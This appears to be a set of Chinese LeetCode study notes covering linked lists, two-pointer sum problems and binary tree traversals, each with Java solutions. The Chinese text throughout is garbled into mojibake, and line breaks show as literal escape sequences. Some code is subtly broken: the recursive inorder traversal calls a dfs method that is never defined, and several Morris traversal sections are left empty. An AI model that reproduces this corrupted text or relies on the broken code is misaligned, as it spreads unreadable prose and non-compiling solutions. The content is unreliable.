//ä¿ç•™ k ä¸ªç›¸åŒæ•°å­—\n    int process(int[] nums, int k) {\n        int idx = 0; \n        for (int x : nums) {\n            if (idx < k || nums[idx - k] != x) \n              nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n```\n\n### [é¢è¯•é¢˜ 02.07. é“¾è¡¨ç›¸äº¤](https://leetcode.cn/problems/intersection-of-two-linked-lists-lcci/)\n\n>è¾“å…¥ä¸¤ä¸ªé“¾è¡¨ï¼Œæ‰¾å‡ºå®ƒä»¬çš„ç¬¬ä¸€ä¸ªå…¬å…±èŠ‚ç‚¹ã€‚\n>\n>å¦‚ä¸‹é¢çš„ä¸¤ä¸ªé“¾è¡¨ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148217.png)\n>\n>åœ¨èŠ‚ç‚¹ c1 å¼€å§‹ç›¸äº¤ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148988.png)\n>\n>```\n>è¾“å…¥ï¼šintersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3\n>è¾“å‡ºï¼šReference of the node with value = 8\n>è¾“å…¥è§£é‡Šï¼šç›¸äº¤èŠ‚ç‚¹çš„å€¼ä¸º 8 ï¼ˆæ³¨æ„ï¼Œå¦‚æœä¸¤ä¸ªåˆ—è¡¨ç›¸äº¤åˆ™ä¸èƒ½ä¸º 0ï¼‰ã€‚ä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [4,1,8,4,5]ï¼Œé“¾è¡¨ B ä¸º [5,0,1,8,4,5]ã€‚åœ¨ A ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 2 ä¸ªèŠ‚ç‚¹ï¼›åœ¨ B ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 3 ä¸ªèŠ‚ç‚¹ã€‚\n>```\n>\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148108.png)\n>\n>```\n>è¾“å…¥ï¼šintersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1\n>è¾“å‡ºï¼šReference of the node with value = 2\n>è¾“å…¥è§£é‡Šï¼šç›¸äº¤èŠ‚ç‚¹çš„å€¼ä¸º 2 ï¼ˆæ³¨æ„ï¼Œå¦‚æœä¸¤ä¸ªåˆ—è¡¨ç›¸äº¤åˆ™ä¸èƒ½ä¸º 0ï¼‰ã€‚ä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [0,9,1,2,4]ï¼Œé“¾è¡¨ B ä¸º [3,2,4]ã€‚åœ¨ A ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼›åœ¨ B ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 1 ä¸ªèŠ‚ç‚¹ã€‚\n>```\n>\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148832.png)\n>\n>```\n>è¾“å…¥ï¼šintersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2\n>è¾“å‡ºï¼šnull\n>è¾“å…¥è§£é‡Šï¼šä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [2,6,4]ï¼Œé“¾è¡¨ B ä¸º [1,5]ã€‚ç”±äºè¿™ä¸¤ä¸ªé“¾è¡¨ä¸ç›¸äº¤ï¼Œæ‰€ä»¥ intersectVal å¿…é¡»ä¸º 0ï¼Œè€Œ skipA å’Œ skipB å¯ä»¥æ˜¯ä»»æ„å€¼ã€‚\n>è§£é‡Šï¼šè¿™ä¸¤ä¸ªé“¾è¡¨ä¸ç›¸äº¤ï¼Œå› æ­¤è¿”å› nullã€‚\n>```\n\n```java\npublic class Solution {\n    public ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA;\n        ListNode B = headB;\n        while(A != B){\n            if(A != null) A = A.next;\n            else A = headB;\n            if(B != null) B = B.next;\n            else B = headA;\n        }\n        return A;\n    }\n}\n```\n\n### [142. ç¯å½¢é“¾è¡¨ II ](https://leetcode.cn/problems/linked-list-cycle-ii/description/)\n\nç»™å®šä¸€ä¸ªé“¾è¡¨çš„å¤´èŠ‚ç‚¹  `head` ï¼Œè¿”å›é“¾è¡¨å¼€å§‹å…¥ç¯çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚ _å¦‚æœé“¾è¡¨æ— ç¯ï¼Œåˆ™è¿”å› `null`ã€‚_\n\nå¦‚æœé“¾è¡¨ä¸­æœ‰æŸä¸ªèŠ‚ç‚¹ï¼Œå¯ä»¥é€šè¿‡è¿ç»­è·Ÿè¸ª `next` æŒ‡é’ˆå†æ¬¡åˆ°è¾¾ï¼Œåˆ™é“¾è¡¨ä¸­å­˜åœ¨ç¯ã€‚ ä¸ºäº†è¡¨ç¤ºç»™å®šé“¾è¡¨ä¸­çš„ç¯ï¼Œè¯„æµ‹ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨æ•´æ•° `pos` æ¥è¡¨ç¤ºé“¾è¡¨å°¾è¿æ¥åˆ°é“¾è¡¨ä¸­çš„ä½ç½®ï¼ˆ**ç´¢å¼•ä» 0 å¼€å§‹**ï¼‰ã€‚å¦‚æœ `pos` æ˜¯ `-1`ï¼Œåˆ™åœ¨è¯¥é“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚**æ³¨æ„ï¼š`pos` ä¸ä½œä¸ºå‚æ•°è¿›è¡Œä¼ é€’**ï¼Œä»…ä»…æ˜¯ä¸ºäº†æ ‡è¯†é“¾è¡¨çš„å®é™…æƒ…å†µã€‚\n\n**ä¸å…è®¸ä¿®æ”¹** é“¾è¡¨ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2018/12/07/circularlinkedlist.png)\n\n```\nè¾“å…¥ï¼šhead = [3,2,0,-4], pos = 1\nè¾“å‡ºï¼šè¿”å›ç´¢å¼•ä¸º 1 çš„é“¾è¡¨èŠ‚ç‚¹\nè§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬äºŒä¸ªèŠ‚ç‚¹ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png)\n\n```\nè¾“å…¥ï¼šhead = [1,2], pos = 0\nè¾“å‡ºï¼šè¿”å›ç´¢å¼•ä¸º 0 çš„é“¾è¡¨èŠ‚ç‚¹\nè§£é‡Šï¼šé“¾è¡¨ä¸­æœ‰ä¸€ä¸ªç¯ï¼Œå…¶å°¾éƒ¨è¿æ¥åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n![](https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png)\n\n```\nè¾“å…¥ï¼šhead = [1], pos = -1\nè¾“å‡ºï¼šè¿”å› null\nè§£é‡Šï¼šé“¾è¡¨ä¸­æ²¡æœ‰ç¯ã€‚\n```\n\n**è¿›é˜¶ï¼š**ä½ æ˜¯å¦å¯ä»¥ä½¿ç”¨ `O(1)` ç©ºé—´è§£å†³æ­¤é¢˜ï¼Ÿ\n\n------\n\n**æ–¹æ³•ä¸€ï¼šå“ˆå¸Œè¡¨**\n\néå†é“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ï¼Œå¹¶å°†å®ƒè®°å½•ä¸‹æ¥ï¼›ä¸€æ—¦é‡åˆ°äº†æ­¤å‰éå†è¿‡çš„èŠ‚ç‚¹ï¼Œå°±å¯ä»¥åˆ¤å®šé“¾è¡¨ä¸­å­˜åœ¨ç¯ã€‚\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        Set<ListNode> set = new HashSet<>();\n        ListNode temp = head;\n        while(temp != null){\n            if(set.contains(temp)){\n                return temp;\n            }\n            set.add(temp);\n            temp = temp.next;\n        }\n        return null;\n    }\n}\n```\n\næ—¶é—´å¤æ‚åº¦ï¼šO(N)ï¼Œå…¶ä¸­ N ä¸ºé“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°ç›®ã€‚æˆ‘ä»¬æ°å¥½éœ€è¦è®¿é—®é“¾è¡¨ä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹ã€‚\n\nç©ºé—´å¤æ‚åº¦ï¼šO(N)ï¼Œå…¶ä¸­ N ä¸ºé“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°ç›®ã€‚æˆ‘ä»¬éœ€è¦å°†é“¾è¡¨ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¿å­˜åœ¨å“ˆå¸Œè¡¨å½“ä¸­ã€‚\n\n**æ–¹æ³•äºŒï¼šå¿«æ…¢æŒ‡é’ˆ**\n\n**åŒæŒ‡é’ˆç¬¬ä¸€æ¬¡ç›¸é‡ï¼š** è®¾ä¸¤æŒ‡é’ˆ `fast`ï¼Œ`slow` æŒ‡å‘é“¾è¡¨å¤´éƒ¨ `head`ï¼Œ`fast` æ¯è½®èµ° 2 æ­¥ï¼Œ`slow` æ¯è½®èµ° 1 æ­¥ï¼›\n\n1.  **ç¬¬ä¸€ç§ç»“æœï¼š** `fast` æŒ‡é’ˆèµ°è¿‡é“¾è¡¨æœ«ç«¯ï¼Œè¯´æ˜é“¾è¡¨æ— ç¯ï¼Œç›´æ¥è¿”å› `null`ï¼›\n2.  **ç¬¬äºŒç§ç»“æœï¼š** å½“`fast == slow`æ—¶ï¼Œ ä¸¤æŒ‡é’ˆåœ¨ç¯ä¸­ **ç¬¬ä¸€æ¬¡ç›¸é‡** ã€‚\n\n**åŒæŒ‡é’ˆç¬¬äºŒæ¬¡ç›¸é‡ï¼š**\n\n-   `slow`æŒ‡é’ˆ **ä½ç½®ä¸å˜** ï¼Œå°†`fast`æŒ‡é’ˆé‡æ–° **æŒ‡å‘é“¾è¡¨å¤´éƒ¨èŠ‚ç‚¹** ï¼›`slow`å’Œ`fast`åŒæ—¶æ¯è½®å‘å‰èµ° 1 æ­¥ï¼›\n-   å½“ `fast` æŒ‡é’ˆèµ°åˆ°é“¾è¡¨ç¯å…¥å£ï¼Œ**ä¸¤æŒ‡é’ˆé‡åˆ**ã€‚\n\n```java\npublic class Solution {\n    public ListNode detectCycle(ListNode head) {\n        ListNode fast = head, slow = head;\n        while(true){\n            if(fast == null || fast.next == null) return null;\n            fast = fast.next.next;\n            slow = slow.next;\n            if(fast == slow) break;\n        }\n        fast = head;\n        while(fast != slow){\n            fast = fast.next;\n            slow = slow.next;\n        }\n        return fast;\n    }\n}\n```\n\n### [15. ä¸‰æ•°ä¹‹å’Œ](https://leetcode.cn/problems/3sum/)\n\nç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ `nums` ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸‰å…ƒç»„ `[nums[i], nums[j], nums[k]]` æ»¡è¶³ `i != j`ã€`i != k` ä¸” `j != k` ï¼ŒåŒæ—¶è¿˜æ»¡è¶³ `nums[i] + nums[j] + nums[k] == 0` ã€‚è¯·ä½ è¿”å›æ‰€æœ‰å’Œä¸º `0` ä¸”ä¸é‡å¤çš„ä¸‰å…ƒç»„ã€‚\n\n**æ³¨æ„ï¼š**ç­”æ¡ˆä¸­ä¸å¯ä»¥åŒ…å«é‡å¤çš„ä¸‰å…ƒç»„ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [-1,0,1,2,-1,-4]\nè¾“å‡ºï¼š[[-1,-1,2],[-1,0,1]]\nè§£é‡Šï¼š\nnums[0] + nums[1] + nums[2] = (-1) + 0 + 1 = 0 ã€‚\nnums[1] + nums[2] + nums[4] = 0 + 1 + (-1) = 0 ã€‚\nnums[0] + nums[3] + nums[4] = (-1) + 2 + (-1) = 0 ã€‚\nä¸åŒçš„ä¸‰å…ƒç»„æ˜¯ [-1,0,1] å’Œ [-1,-1,2] ã€‚\næ³¨æ„ï¼Œè¾“å‡ºçš„é¡ºåºå’Œä¸‰å…ƒç»„çš„é¡ºåºå¹¶ä¸é‡è¦ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [0,1,1]\nè¾“å‡ºï¼š[]\nè§£é‡Šï¼šå”¯ä¸€å¯èƒ½çš„ä¸‰å…ƒç»„å’Œä¸ä¸º 0 ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [0,0,0]\nè¾“å‡ºï¼š[[0,0,0]]\nè§£é‡Šï¼šå”¯ä¸€å¯èƒ½çš„ä¸‰å…ƒç»„å’Œä¸º 0 ã€‚\n```\n\n------\n\n```java\n//åŒæŒ‡é’ˆ\nclass Solution {\n    public static List<List<Integer>> threeSum(int[] nums) {\n        List<List<Integer>> ans = new ArrayList();\n        int len = nums.length;\n        if(nums == null || len < 3) return ans;\n        Arrays.sort(nums); // æ’åº\n        for (int i = 0; i < len ; i++) {\n            //å¦‚æœç¬¬ä¸€ä¸ªå°±å¤§äº0ï¼Œåˆ™ä¸‰æ•°ä¹‹å’Œä¸€å®šå¤§äº0ï¼Œç»“æŸå¾ªç¯\n            if(nums[i] > 0) break; \n            //å¦‚æœè¿ç»­ä¸¤ä¸ªå…ƒç´ ç›¸ç­‰å°±è·³è¿‡ç¬¬äºŒä¸ªï¼Œé¿å…é‡å¤\n            if(i > 0 && nums[i] == nums[i-1]) continue; // å»é‡\n            int L = i + 1;\n            int R = len - 1;\n            while(L < R){\n                int sum = nums[i] + nums[L] + nums[R];\n                if (sum < 0) L++;\n                else if (sum > 0) R--;\n                else if(sum == 0){\n                    ans.add(Arrays.asList(nums[i],nums[L],nums[R]));\n                    while (L < R && nums[L] == nums[++L]); // å»é‡\n                    while (L < R && nums[R] == nums[--R]); // å»é‡\n                }\n            }\n        }        \n        return ans;\n    }\n}\n```\n\n### [18. å››æ•°ä¹‹å’Œ](https://leetcode.cn/problems/4sum/)\n\nç»™ä½ ä¸€ä¸ªç”± `n` ä¸ªæ•´æ•°ç»„æˆçš„æ•°ç»„ `nums` ï¼Œå’Œä¸€ä¸ªç›®æ ‡å€¼ `target` ã€‚è¯·ä½ æ‰¾å‡ºå¹¶è¿”å›æ»¡è¶³ä¸‹è¿°å…¨éƒ¨æ¡ä»¶ä¸”**ä¸é‡å¤**çš„å››å…ƒç»„ `[nums[a], nums[b], nums[c], nums[d]]` ï¼ˆè‹¥ä¸¤ä¸ªå››å…ƒç»„å…ƒç´ ä¸€ä¸€å¯¹åº”ï¼Œåˆ™è®¤ä¸ºä¸¤ä¸ªå››å…ƒç»„é‡å¤ï¼‰ï¼š\n\n-   `0 <= a, b, c, d < n`\n-   `a`ã€`b`ã€`c` å’Œ `d` **äº’ä¸ç›¸åŒ**\n-   `nums[a] + nums[b] + nums[c] + nums[d] == target`\n\nä½ å¯ä»¥æŒ‰ **ä»»æ„é¡ºåº** è¿”å›ç­”æ¡ˆ ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [1,0,-1,0,-2,2], target = 0\nè¾“å‡ºï¼š[[-2,-1,1,2],[-2,0,0,2],[-1,0,0,1]]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [2,2,2,2,2], target = 8\nè¾“å‡ºï¼š[[2,2,2,2]]\n```\n\n------\n\n```java\nclass Solution {\n    public List<List<Integer>> fourSum(int[] nums, int target) {\n        List<List<Integer>> res = new ArrayList<>();\n        Arrays.sort(nums);\n        for(int i = 0; i < nums.length; i++){\n            //nums[i] < 0æ—¶ä¸ä¸€å®šå¾—å»é‡\n            //æ•°ç»„æ˜¯[-4, -3, -2, -1]ï¼Œtargetæ˜¯-10ï¼Œä¸èƒ½å› ä¸º-4 > -10è€Œè·³è¿‡\n            if(nums[i] > 0 && nums[i] > target) break; //å»é‡\n            if(i > 0 && nums[i] == nums[i - 1]) continue; //å»é‡\n            for(int j = i + 1; j < nums.length; j++){\n                if (j > i + 1 && nums[j - 1] == nums[j]) continue; //å»é‡\n                int L = j + 1, R = nums.length - 1;\n                while(L < R) {\n                    int sum = nums[i] + nums[j] + nums[L] + nums[R];\n                    if(sum > target) R--;\n                    else if(sum < target) L++;\n                    else {\n                        res.add(Arrays.asList(nums[i],nums[j],nums[L],nums[R]));\n                        while(L < R && nums[L] == nums[L + 1]) L++; //å»é‡\n                        while(L < R && nums[R] == nums[R - 1]) R--; //å»é‡\n                        L++; \n                        R--;\n                    }\n                }  \n            }\n        }\n        return res;\n    }\n}\n```\n\n## â‘¦äºŒå‰æ ‘\n\näºŒå‰æ ‘åŸºç¡€çŸ¥è¯†è¯·å‚è€ƒï¼š[æ•°æ®ç»“æ„-æ ‘ | ç®€è¨€ä¹‹ (jwt1399.top)](https://jwt1399.top/posts/19968.html)\n\n```java\n//Definition for a binary tree node.\npublic class TreeNode {\n    int val;\n  \tTreeNode left;\n  \tTreeNode right;\n  \tTreeNode() {}\n  \tTreeNode(int val) { this.val = val; }\n  \tTreeNode(int val, TreeNode left, TreeNode right) {\n    \t\tthis.val = val;\n    \t\tthis.left = left;\n    \t\tthis.right = right;\n  \t}\n}\n```\n\næˆ‘ä»¬æœ‰ä¸€æ£µäºŒå‰æ ‘ï¼š\n\n```\n               æ ¹\n              /  \\\n             å·¦   å³\n```\n\næ ˆæ˜¯ä¸€ç§ `å…ˆè¿›åå‡º`çš„ç»“æ„ï¼Œé‚£ä¹ˆå…¥æ ˆé¡ºåºå¿…é¡»è°ƒæ•´ä¸ºå€’åº\n\n- å‰åºéå†ï¼Œå‡ºæ ˆé¡ºåºï¼šæ ¹å·¦å³; å…¥æ ˆé¡ºåºï¼šå³å·¦æ ¹\n- ä¸­åºéå†ï¼Œå‡ºæ ˆé¡ºåºï¼šå·¦æ ¹å³; å…¥æ ˆé¡ºåºï¼šå³æ ¹å·¦\n- ååºéå†ï¼Œå‡ºæ ˆé¡ºåºï¼šå·¦å³æ ¹; å…¥æ ˆé¡ºåºï¼šæ ¹å³å·¦\n\n### â¶äºŒå‰æ ‘éå†\n\n#### [144. äºŒå‰æ ‘çš„å‰åºéå†](https://leetcode.cn/problems/binary-tree-preorder-traversal/)\n\n> **å…ˆè¾“å‡ºçˆ¶èŠ‚ç‚¹**ï¼Œå†éå†å·¦å­æ ‘å’Œå³å­æ ‘\n\n##### 1.é€’å½’\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(h)\n**/\nclass Solution {\n    public List<Integer> preorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        dfs(root, res);\n        return res;\n    }\n\n    public void dfs(TreeNode root, List<Integer> res){\n        if(root == null){\n            return;\n        }\n        res.add(root.val);\n        dfs(root.left, res);\n        dfs(root.right, res);\n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n> 1. å¼¹æ ˆé¡¶å…¥åˆ—è¡¨\n> 2. å¦‚æœ‰å³ï¼Œ**å…ˆ**å…¥å³\n> 3. å¦‚æœ‰å·¦ï¼Œ**å†**å…¥å·¦\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(h)\n**/\nclass Solution {\n    public List<Integer> preorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        Deque<TreeNode> stack = new LinkedList<>();// ç”¨æ ˆæ¥å®ç°è¿­ä»£\n        if(root == null) {\n          return res;\n        }\n        stack.push(root);\n        while(!stack.isEmpty()){\n            TreeNode tmp = stack.pop();\n            res.add(tmp.val);\n            if(tmp.right != null){ //å…ˆè¿›å³èŠ‚ç‚¹ï¼Œåå‡º\n                stack.push(tmp.right);\n            }\n            if(tmp.left != null){ //åè¿›å·¦èŠ‚ç‚¹ï¼Œå…ˆå‡º\n                stack.push(tmp.left);\n            }\n        }\n        return res;\n    } \n}\n```\n\n##### 3.Morris\n\nMorris éå†çš„æ ¸å¿ƒæ€æƒ³æ˜¯åˆ©ç”¨æ ‘çš„å¤§é‡ç©ºé—²æŒ‡é’ˆï¼Œå®ç°ç©ºé—´å¼€é”€çš„æé™ç¼©å‡ã€‚å…¶å‰åºéå†è§„åˆ™æ€»ç»“å¦‚ä¸‹ï¼š\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(1)\n**/\n\n```\n\n#### [94. äºŒå‰æ ‘çš„ä¸­åºéå†](https://leetcode.cn/problems/binary-tree-inorder-traversal/)\n\n> å…ˆéå†å·¦å­æ ‘ï¼Œ**å†è¾“å‡ºçˆ¶èŠ‚ç‚¹**ï¼Œå†éå†å³å­æ ‘\n\n##### 1.é€’å½’\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(h)\n**/\nclass Solution {\n    public List<Integer> inorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        dfs(root, res);\n        return res;\n    }\n    public void inorderRecur(TreeNode root, List<Integer> res){\n        if(root == null){\n            return;\n        }\n        dfs(root.left, res);\n        res.add(root.val);\n        dfs(root.right, res);\n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n> 1. æ ¹ç»“ç‚¹ä¸ä¸ºç©ºï¼Œå…¥æ ˆå¹¶å‘å·¦èµ°ã€‚æ•´æ¡ç•Œä¾æ¬¡å…¥æ ˆ\n> 2. æ ¹ç»“ç‚¹ä¸ºç©ºï¼Œå¼¹æ ˆé¡¶æ‰“å°ï¼Œå‘å³èµ°ã€‚\n>\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(h)\n**/\nclass Solution {\n    public List<Integer> inorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<Integer>();\n        Deque<TreeNode> stack = new LinkedList<TreeNode>();\n        while (root != null || !stack.isEmpty()) { \n            while (root != null) { // å°†æ ¹å’Œå·¦å­æ ‘å…¥æ ˆ\n                stack.push(root);\n                root = root.left;\n            }\n            TreeNode tmp = stack.pop(); \n            res.add(tmp.val);\n            root = tmp.right;\n        }\n        return res;\n    }\n}\n```\n\n##### 3.Morris\n\nã€‚ã€‚ã€‚\n\n#### [145. äºŒå‰æ ‘çš„ååºéå†](https://leetcode.cn/problems/binary-tree-postorder-traversal/)\n\n> å…ˆéå†å·¦å­æ ‘ï¼Œå†éå†å³å­æ ‘ï¼Œ**æœ€åè¾“å‡ºçˆ¶èŠ‚ç‚¹**\n\n##### 1.é€’å½’\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(h)\n**/\nclass Solution {\n    public List<Integer> postorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        dfs(root, res);\n        return res;\n    }\n\n    public void dfs(TreeNode root ,List<Integer> res){\n        if(root == null){\n            return;\n        }\n        dfs(root.left, res);\n        dfs(root.right, res);\n        res.add(root.val);\n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n> 1. å¼¹æ ˆé¡¶è¾“å‡º\n> 2. å¦‚æœ‰å·¦ï¼Œå‹å…¥å·¦\n> 3. å¦‚æœ‰å³ï¼Œå‹å…¥å³\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(h)\n**/\nclass Solution {\n  public List<Integer> postorderTraversal(TreeNode root) {\n          List<Integer> res = new ArrayList<>();\n          if (root == null) {\n              return res;\n          }\n          Deque<TreeNode> stack = new LinkedList<>();\n          TreeNode prev = null;\n          while (!stack.isEmpty() || root != null) {\n              while (root != null) { // å°†å·¦å­æ ‘å…¨éƒ¨å…¥æ ˆ\n                  stack.push(root);\n                  root = root.left;\n              }\n              root = stack.pop(); // æ‹¿å–æ ˆé¡¶èŠ‚ç‚¹\n              if (root.right == null || root.right == prev) {\n                  res.add(root.val);\n                  prev = root;\n                  root = null;\n              } else {\n                  // é‡æ–°æŠŠæ ¹èŠ‚ç‚¹å…¥æ ˆï¼Œå¤„ç†å®Œå³å­æ ‘è¿˜è¦å›æ¥å¤„ç†æ ¹èŠ‚ç‚¹\n                  stack.push(root);\n                  // å½“å‰èŠ‚ç‚¹ä¸ºå³å­æ ‘\n                  root = root.right;\n              }\n          }\n          return res;\n    }\n}\n\nclass Solution {\n    public List<Integer> postorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        Deque<TreeNode> stack = new LinkedList<>();\n        if(root == null){\n            return res;\n        }\n        // å¦‚æœå½“å‰å¤„ç†èŠ‚ç‚¹ä¸ä¸ºç©ºæˆ–è€…æ ˆä¸­æœ‰æ•°æ®åˆ™ç»§ç»­å¤„ç†\n        stack.push(root);\n        while (!stack.isEmpty()) {\n            TreeNode tmp = stack.pop();\n            res.add(tmp.val);\n            if(tmp.left != null) stack.push(tmp.left);\n            if(tmp.right != null) stack.push(tmp.right); //å‡ºæ ˆæ ¹å³å·¦\n        }\n        Collections.reverse(res);//åè½¬ä¹‹åï¼šå·¦å³æ ¹\n        return res;\n    }\n}    \n```\n\n##### 3.Morris\n\n#### [102. äºŒå‰æ ‘çš„å±‚åºéå†](https://leetcode.cn/problems/binary-tree-level-order-traversal/)\n\n##### 1.é€’å½’\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(h)\n**/\nclass Solution {\n  public List<List<Integer>> levelOrder(TreeNode root) {\n        List<List<Integer>> res = new ArrayList<List<Integer>>();\n        dfs(root, 0, res);\n        return res;\n    }\n\n    public void dfs(TreeNode root, Integer deep, List<List<Integer>> res) {\n        if (root == null) return;\n        deep++;\n        if (res.size() < deep) {\n            //å½“å±‚çº§å¢åŠ æ—¶ï¼Œresçš„Itemä¹Ÿå¢åŠ \n            List<Integer> item = new ArrayList<Integer>();\n            res.add(item);\n        }\n        //åˆ©ç”¨resçš„ç´¢å¼•å€¼è¿›è¡Œå±‚çº§ç•Œå®š\n        res.get(deep - 1).add(root.val);\n\n        dfs(root.left, deep, res);\n        dfs(root.right, deep, res);\n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n```java\n/**\n *æ—¶é—´ï¼šO(n)\n *ç©ºé—´ï¼šO(n)\n**/\n//å€ŸåŠ©é˜Ÿåˆ—\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        List<List<Integer>> res = new ArrayList<List<Integer>>();\n        if (root == null) {\n            return res;\n        }\n        Queue<TreeNode> queue = new LinkedList<TreeNode>();\n        queue.offer(root);\n        while (!queue.isEmpty()) {\n            List<Integer> level = new ArrayList<Integer>();\n            int currentLevelSize = queue.size();\n            for (int i = 1; i <= currentLevelSize; ++i) {\n                TreeNode node = queue.poll();\n                level.add(node.val);\n                if (node.left != null) {\n                    queue.offer(node.left);\n                }\n                if (node.right != null) {\n                    queue.offer(node.right);\n                }\n            }\n            res.add(level);\n        }\n        return res;\n    }\n}\n```\n\n### â·äºŒå‰æ ‘æ·±åº¦\n\n#### [104. äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦](https://leetcode.cn/problems/maximum-depth-of-binary-tree/)\n\nç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ‰¾å‡ºå…¶æœ€å¤§æ·±åº¦ã€‚\n\näºŒå‰æ ‘çš„æ·±åº¦ä¸ºæ ¹èŠ‚ç‚¹åˆ°æœ€è¿œå¶å­èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•°ã€‚\n\n**è¯´æ˜:** å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚\n\n**ç¤ºä¾‹ï¼š**\nç»™å®šäºŒå‰æ ‘ `[3,9,20,null,null,15,7]`ï¼Œ\n\n```\n    3\n   / \\\n  9  20\n    /  \\\n   15   7\n```\n\nè¿”å›å®ƒçš„æœ€å¤§æ·±åº¦ 3 ã€‚\n\n------\n##### 1.é€’å½’\n\n```java\n// å·¦å­æ ‘å’Œå³å­æ ‘çš„æœ€å¤§æ·±åº¦ l å’Œ rï¼Œé‚£ä¹ˆè¯¥äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦å³ä¸º maxâ¡(l,r)+1\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(H)\nclass Solution {\n    public int maxDepth(TreeNode root) {\n        if (root == null) {\n            return 0;\n        } \n        int leftDepth = maxDepth(root.left);\n        int rightDepth = maxDepth(root.right);\n        return Math.max(leftDepth, rightDepth) + 1;\n    }\n}\n```\n\n##### 2.è¿­ä»£\n\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(N)\nclass Solution {\n    public int maxDepth(TreeNode root) {\n        if (root == null) {\n            return 0;\n        }\n        int count = 0;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            count++;\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        